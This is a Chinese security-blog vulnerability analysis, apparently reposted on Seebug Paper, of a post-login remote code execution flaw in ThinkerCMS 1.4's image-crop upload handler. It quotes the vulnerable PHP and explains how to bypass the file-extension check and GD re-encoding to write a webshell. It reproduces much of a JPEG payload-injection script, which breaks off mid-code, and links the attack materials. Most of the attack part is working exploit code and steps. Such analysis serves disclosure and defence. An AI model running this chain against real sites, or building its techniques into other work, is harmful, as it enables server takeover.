<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>ThinkerPHP后台远程任意代码执行漏洞分析</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">ThinkerPHP后台远程任意代码执行漏洞分析</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-09-08" class="timeago">1 周，4 日 之前</time>
          <time datetime="2017-09-08" class="fulldate">九月 08, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/vul-analysis/">漏洞分析</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>来源：<a href="https://xianzhi.aliyun.com/forum/read/2084.html" title="作者：FaIth4444@先知安全技术社区">先知安全技术社区</a><br/>
作者：FaIth4444</p>
<h4>漏洞描述</h4>
<p>ThinkerPHP，由 thinker 开发维护。基于 thinkphp3.2 开发的一款部分开源的cms系统，前期是仿的phpcms系统，后在在模仿基础上对界面等做了优化。</p>
<p>thinkphp3.2 的优势在于相对应 phpcms 用更少的代码实现更多的功能， 基于命名空间的相对较新的架构以及拥有更好的底层扩展性。ThinkerPHP希望融合phpcms和thinkphp3.2的优点并志在收获一个扩展性好、开发效率高、用户体验佳、底层扩展性好的快速开发系统。在开发过程中作者一直秉承专注、专业、专心的精神，不断完善。</p>
<p>ThinkerCMS1.4 （最新版）<code>InputController.class.php</code> 页面由于对 <code>$_POST</code> 等参数没有进行有效的判断和过滤，导致存在任意代码执行漏洞，允许攻击者利用漏洞全完获取Webshell权限。</p>
<h4>溯源发现危险代码块</h4>
<h6>① 漏洞触发位置</h6>
<p>文件位置： <code>D:\WWW\Modules\Plug\Controller\InputController.class.php</code>   （67行）</p>
<p>触发函数： <code>public function cropzoomUpload()</code></p>
<div class="codehilite"><pre><span></span>public function cropzoomUpload()
        {
                if(session(&quot;userinfo&quot;)==NULL)E(&#39;没有登陆！&#39;);
                load(&#39;@.cropzoom&#39;);
                list($width, $height) = getimagesize($_POST[&quot;imageSource&quot;]);
                $viewPortW = $_POST[&quot;viewPortW&quot;];
                $viewPortH = $_POST[&quot;viewPortH&quot;];

                $pWidth = $_POST[&quot;imageW&quot;];
                $pHeight =  $_POST[&quot;imageH&quot;];
                $ext = end(explode(&quot;.&quot;,$_POST[&quot;imageSource&quot;]));
                $function = returnCorrectFunction($ext);
                $image = $function($_POST[&quot;imageSource&quot;]);

                $width = imagesx($image);
                $height = imagesy($image);

                // Resample
                $image_p = imagecreatetruecolor($pWidth, $pHeight);
                setTransparency($image,$image_p,$ext);
                imagecopyresampled($image_p, $image, 0, 0, 0, 0, $pWidth, $pHeight, $width, $height);
                imagedestroy($image);
                $widthR = imagesx($image_p);
                $hegihtR = imagesy($image_p);

                $selectorX = $_POST[&quot;selectorX&quot;];
                $selectorY = $_POST[&quot;selectorY&quot;];

                if($_POST[&quot;imageRotate&quot;]){
                        $angle = 360 - $_POST[&quot;imageRotate&quot;];
                        $image_p = imagerotate($image_p,$angle,0);

                        $pWidth = imagesx($image_p);
                        $pHeight = imagesy($image_p);

                        //print $pWidth.&quot;---&quot;.$pHeight;

                        $diffW = abs($pWidth - $widthR) / 2;
                        $diffH = abs($pHeight - $hegihtR) / 2;

                        $_POST[&quot;imageX&quot;] = ($pWidth &gt; $widthR ? $_POST[&quot;imageX&quot;] - $diffW : $_POST[&quot;imageX&quot;] + $diffW);
                        $_POST[&quot;imageY&quot;] = ($pHeight &gt; $hegihtR ? $_POST[&quot;imageY&quot;] - $diffH : $_POST[&quot;imageY&quot;] + $diffH);

                }

                $dst_x = $src_x = $dst_y = $src_y = 0;

                if($_POST[&quot;imageX&quot;] &gt; 0){
                        $dst_x = abs($_POST[&quot;imageX&quot;]);
                }else{
                        $src_x = abs($_POST[&quot;imageX&quot;]);
                }
                if($_POST[&quot;imageY&quot;] &gt; 0){
                        $dst_y = abs($_POST[&quot;imageY&quot;]);
                }else{
                        $src_y = abs($_POST[&quot;imageY&quot;]);
                }

                $viewport = imagecreatetruecolor($_POST[&quot;viewPortW&quot;],$_POST[&quot;viewPortH&quot;]);
                setTransparency($image_p,$viewport,$ext);

                imagecopy($viewport, $image_p, $dst_x, $dst_y, $src_x, $src_y, $pWidth, $pHeight);

                imagedestroy($image_p);

                $selector = imagecreatetruecolor($_POST[&quot;selectorW&quot;],$_POST[&quot;selectorH&quot;]);

                setTransparency($viewport,$selector,$ext);
                imagecopy($selector, $viewport, 0, 0, $selectorX, $selectorY,$_POST[&quot;viewPortW&quot;],$_POST[&quot;viewPortH&quot;]);

                //获取图片内容
        //var_dump($_POST);
                ob_start();
                parseImage($ext,$selector);
                $img = ob_get_contents();
                ob_end_clean();

                if(filter_var($_POST[&quot;imageSource&quot;], FILTER_VALIDATE_URL))
                {
                        $urlinfo=parse_url($_POST[&quot;imageSource&quot;]);
                        $path=$urlinfo[&#39;path&#39;];
                        $pathinfo=pathinfo($path);

                }
                else
                {
                        $path=$_POST[&quot;imageSource&quot;];
                        $pathinfo=pathinfo($_POST[&quot;imageSource&quot;]);

                }
                $file_name=$pathinfo[&#39;filename&#39;].&#39;_crop.&#39;.$pathinfo[&#39;extension&#39;];//剪切后的图片名称
                $file_path=&#39;.&#39;.$pathinfo[&#39;dirname&#39;].&#39;/&#39;.$file_name;

                file_put_contents($file_path, $img);
                echo C(&#39;upload_host&#39;).$pathinfo[&#39;dirname&#39;].&#39;/&#39;.$file_name;
                imagedestroy($viewport);
        }
</pre></div>


<p>在这里我们可以观察发现 <code>public function cropzoomUpload()</code> 函数的大概操作流程:</p>
<p>1.接受了包括 <code>$_POST["viewPortW"]</code>，<code>$_POST["viewPortH"]</code>，<code>$_POST["imageSource"]</code>等一系列的图片剪切的参数</p>
<p>2.使用这些参数，并调用php-GD库对图片进行渲染和处理</p>
<p>3.将处理后的图片输出到缓冲区，将缓冲区作为图片的内容</p>
<p>4.然后将再根据<code>$_POST["imageSource"]</code>参数进行pathinfo处理，将结果存到<code>$pathinfo</code>，并组合成为写文件的路径<code>$file_path</code></p>
<p>5.将缓冲区内容通过file_put_contents写入指定的$file_path（此处直接写入Webshell，获取Web权限）</p>
<h6>② ByPass （绕过文件后缀名检测，绕过php-GD对图片的渲染和处理导致webshell代码错位失效）</h6>
<p>绕过文件后缀名检测
cropzoom 图片剪切相关的函数</p>
<p>文件位置:  D:\WWW\Modules\Plug\Common\cropzoom.php</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;?</span><span class="nx">php</span>
<span class="cm">/*</span>
<span class="cm">* cropzoom 图片剪切相关的函数</span>
<span class="cm">*/</span>
<span class="kd">function</span> <span class="nx">determineImageScale</span><span class="p">(</span><span class="nx">$sourceWidth</span><span class="p">,</span> <span class="nx">$sourceHeight</span><span class="p">,</span> <span class="nx">$targetWidth</span><span class="p">,</span> <span class="nx">$targetHeight</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">$scalex</span> <span class="o">=</span>  <span class="nx">$targetWidth</span> <span class="o">/</span> <span class="nx">$sourceWidth</span><span class="p">;</span>
        <span class="nx">$scaley</span> <span class="o">=</span>  <span class="nx">$targetHeight</span> <span class="o">/</span> <span class="nx">$sourceHeight</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">min</span><span class="p">(</span><span class="nx">$scalex</span><span class="p">,</span> <span class="nx">$scaley</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">returnCorrectFunction</span><span class="p">(</span><span class="nx">$ext</span><span class="p">){</span>
        <span class="nx">$function</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">switch</span><span class="p">(</span><span class="nx">$ext</span><span class="p">){</span>
                <span class="k">case</span> <span class="s2">&quot;png&quot;</span><span class="o">:</span>
                        <span class="nx">$function</span> <span class="o">=</span> <span class="s2">&quot;imagecreatefrompng&quot;</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;jpeg&quot;</span><span class="o">:</span>
                        <span class="nx">$function</span> <span class="o">=</span> <span class="s2">&quot;imagecreatefromjpeg&quot;</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;jpg&quot;</span><span class="o">:</span>
                        <span class="nx">$function</span> <span class="o">=</span> <span class="s2">&quot;imagecreatefromjpeg&quot;</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;gif&quot;</span><span class="o">:</span>
                        <span class="nx">$function</span> <span class="o">=</span> <span class="s2">&quot;imagecreatefromgif&quot;</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">$function</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">parseImage</span><span class="p">(</span><span class="nx">$ext</span><span class="p">,</span><span class="nx">$img</span><span class="p">){</span>
        <span class="k">switch</span><span class="p">(</span><span class="nx">$ext</span><span class="p">){</span>
                <span class="k">case</span> <span class="s2">&quot;png&quot;</span><span class="o">:</span>
                        <span class="k">return</span> <span class="nx">imagepng</span><span class="p">(</span><span class="nx">$img</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;jpeg&quot;</span><span class="o">:</span>
                        <span class="k">return</span> <span class="nx">imagejpeg</span><span class="p">(</span><span class="nx">$img</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;jpg&quot;</span><span class="o">:</span>
                        <span class="k">return</span> <span class="nx">imagejpeg</span><span class="p">(</span><span class="nx">$img</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s2">&quot;gif&quot;</span><span class="o">:</span>
                        <span class="k">return</span> <span class="nx">imagegif</span><span class="p">(</span><span class="nx">$img</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">setTransparency</span><span class="p">(</span><span class="nx">$imgSrc</span><span class="p">,</span><span class="nx">$imgDest</span><span class="p">,</span><span class="nx">$ext</span><span class="p">){</span>

        <span class="k">if</span><span class="p">(</span><span class="nx">$ext</span> <span class="o">==</span> <span class="s2">&quot;png&quot;</span> <span class="o">||</span> <span class="nx">$ext</span> <span class="o">==</span> <span class="s2">&quot;gif&quot;</span><span class="p">){</span>
                <span class="nx">$trnprt_indx</span> <span class="o">=</span> <span class="nx">imagecolortransparent</span><span class="p">(</span><span class="nx">$imgSrc</span><span class="p">);</span>
                <span class="c1">// If we have a specific transparent color</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">$trnprt_indx</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// Get the original image&#39;s transparent color&#39;s RGB values</span>
                        <span class="nx">$trnprt_color</span>    <span class="o">=</span> <span class="nx">imagecolorsforindex</span><span class="p">(</span><span class="nx">$imgSrc</span><span class="p">,</span> <span class="nx">$trnprt_indx</span><span class="p">);</span>
                        <span class="c1">// Allocate the same color in the new image resource</span>
                        <span class="nx">$trnprt_indx</span>    <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="nx">$trnprt_color</span><span class="p">[</span><span class="s1">&#39;red&#39;</span><span class="p">],</span> <span class="nx">$trnprt_color</span><span class="p">[</span><span class="s1">&#39;green&#39;</span><span class="p">],</span> <span class="nx">$trnprt_color</span><span class="p">[</span><span class="s1">&#39;blue&#39;</span><span class="p">]);</span>
                        <span class="c1">// Completely fill the background of the new image with allocated color.</span>
                        <span class="nx">imagefill</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$trnprt_indx</span><span class="p">);</span>
                        <span class="c1">// Set the background color for new image to transparent</span>
                        <span class="nx">imagecolortransparent</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="nx">$trnprt_indx</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">// Always make a transparent background color for PNGs that don&#39;t have one allocated already</span>
                <span class="nx">elseif</span> <span class="p">(</span><span class="nx">$ext</span> <span class="o">==</span> <span class="s2">&quot;png&quot;</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// Turn off transparency blending (temporarily)</span>
                        <span class="nx">imagealphablending</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                        <span class="c1">// Create a new transparent color for image</span>
                        <span class="nx">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocatealpha</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">127</span><span class="p">);</span>
                        <span class="c1">// Completely fill the background of the new image with allocated color.</span>
                        <span class="nx">imagefill</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$color</span><span class="p">);</span>
                        <span class="c1">// Restore transparency blending</span>
                        <span class="nx">imagesavealpha</span><span class="p">(</span><span class="nx">$imgDest</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                <span class="p">}</span>

        <span class="p">}</span>
<span class="p">}</span>

<span class="o">?&gt;</span>
</pre></div>


<p>对文件后缀名的处理包括主要通过 <code>$_POST["imageSource"]</code> 这个变量的值，包括两部分</p>
<p>1.获取 <code>$_POST["imageSource"]</code> 的值，使用 end 和 explode 获得路径的后缀，根据路径后缀使用对应的 php-GD 库函数进行处理</p>
<div class="codehilite"><pre><span></span>                $ext = end(explode(&quot;.&quot;,$_POST[&quot;imageSource&quot;]));
                $function = returnCorrectFunction($ext);
                $image = $function($_POST[&quot;imageSource&quot;]);
</pre></div>


<p>2.同样是根据的 <code>$_POST["imageSource"]</code> 值进行判断进入不同的分支，然后组合成为 <code>$file_path （file_put_contents</code> 的路径参数）</p>
<div class="codehilite"><pre><span></span>if(filter_var($_POST[&quot;imageSource&quot;], FILTER_VALIDATE_URL))
                {
                        $urlinfo=parse_url($_POST[&quot;imageSource&quot;]);
                        $path=$urlinfo[&#39;path&#39;];
                        $pathinfo=pathinfo($path);

                }
                else
                {
                        $path=$_POST[&quot;imageSource&quot;];
                        $pathinfo=pathinfo($_POST[&quot;imageSource&quot;]);

                }
                $file_name=$pathinfo[&#39;filename&#39;].&#39;_crop.&#39;.$pathinfo[&#39;extension&#39;];//剪切后的图片名称
                $file_path=&#39;.&#39;.$pathinfo[&#39;dirname&#39;].&#39;/&#39;.$file_name;

                file_put_contents($file_path, $img);
</pre></div>


<p>绕过办法，令 <code>$_POST["imageSource"]</code> 为``</p>
<p>1.使用end函数  所以加入使用  ?1.jpg  作为请求的参数进行绕过，不然会因为找不到函数报错终止，因为程序会调用 returnCorrectFunction() 函数根据后缀（此处为JPG）进行调用其他php-GD函数</p>
<p>2.因为使用的 pathinfo() 处理 <code>$_POST["imageSource"]</code>，所以 前半部分为 payload_faith4444_crop.php</p>
<p>至此，成功绕过文件后缀名检测</p>
<p><strong>绕过php-GD对图片的渲染和处理导致webshell代码错位失效(此处参考索马里海盗方法)</strong></p>
<p>图片会经过 php-GD 处理，会导致 webshell 语句错位失效，如何在处理后仍然保留 shell 语句呢？</p>
<p>在正常图片中插入shell并无视GD图像库的处理，常规方法有两种</p>
<p>1.对比两张经过 php-gd 库转换过的 gif 图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行</p>
<p>2.利用 php-gd 算法上的问题进行绕过</p>
<p>这里我们选择第二种，使用脚本进行处理图片并绕过</p>
<p>1、上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg</p>
<p>2、执行图片处理脚本脚本进行处理   php jpg_payload.php x.jpg</p>
<p>3、如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留 webshell 代码语句</p>
<p>tips：</p>
<p>1、图片找的稍微大一点 成功率更高</p>
<p>2、shell 语句越短成功率越高</p>
<p>3、一张图片不行就换一张 不要死磕</p>
<p>图片处理脚本，还有具体操作会在验证部分详细写出！！！</p>
<h4>漏洞攻击与利用</h4>
<p>漏洞复现材料（cms源码，攻击脚本，攻击图片） ：链接：<a href="http://pan.baidu.com/s/1eSmtiSE">http://pan.baidu.com/s/1eSmtiSE</a> 密码：tsna</p>
<p>（自己的php-web环境的vps上,一定要是phpweb环境（并开启短标签），phpweb环境（并开启短标签），其他环境也可，但需要自行构造payload所需的图片）</p>
<p>本地验证</p>
<h6>① 首先登陆后台</h6>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/826f1790-babb-4b33-a28f-2929669f1ade.jpg-w331s" /></p>
<h6>② 生成能经过php-GD处理后仍然能够保留webshell语句的图片</h6>
<p>首先准备一张图片，并重名faith.php</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/09/5cf025cf-6599-4d79-96ed-fa4075249f95.jpg-w331s" /></p>
<p>过GD处理渲染的处理脚本</p>
<div class="codehilite"><pre><span></span> <span class="cp">&lt;?php</span>
    <span class="cm">/*</span>

<span class="cm">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations</span>
<span class="cm">    caused by PHP functions imagecopyresized() and imagecopyresampled().</span>
<span class="cm">    It is necessary that the size and quality of the initial image are the same as those of the processed</span>
<span class="cm">    image.</span>

<span class="cm">    1) Upload an arbitrary image via secured files upload script</span>
<span class="cm">    2) Save the processed image and launch:</span>
<span class="cm">    php jpg_payload.php &lt;jpg_name.jpg&gt;</span>

<span class="cm">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span>

<span class="cm">    Since the most straightforward injection method is used, the following problems can occur:</span>
<span class="cm">    1) After the second processing the injected data may become partially corrupted.</span>
<span class="cm">    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.</span>
<span class="cm">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another </span>
<span class="cm">    initial image.</span>

<span class="cm">    Sergey Bobrov @Black2Fan.</span>

<span class="cm">    See also:</span>
<span class="cm">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span>

<span class="cm">    */</span>

    <span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s2">&quot;&lt;?echo&#39;&lt;?phpinfo();?&gt;&#39;;?&gt;&quot;</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nb">set_error_handler</span><span class="p">(</span><span class="s2">&quot;custom_error_handler&quot;</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
        <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$outStream</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
            <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
            <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
                <span class="nv">$outStreamTmp</span> <span class="o">=</span> 
                    <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
                    <span class="nv">$miniPayload</span> <span class="o">.</span> 
                    <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span> 
                    <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
                <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">break</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
                    <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
                    <span class="nv">$outStream</span> <span class="o">=</span> 
                        <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
                        <span class="nv">$miniPayload</span> <span class="o">.</span> 
                        <span class="nb">substr</span><span class="p">(</span>
                            <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
                                <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
                            <span class="mi">0</span><span class="p">,</span>
                            <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span> 
                                <span class="nb">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
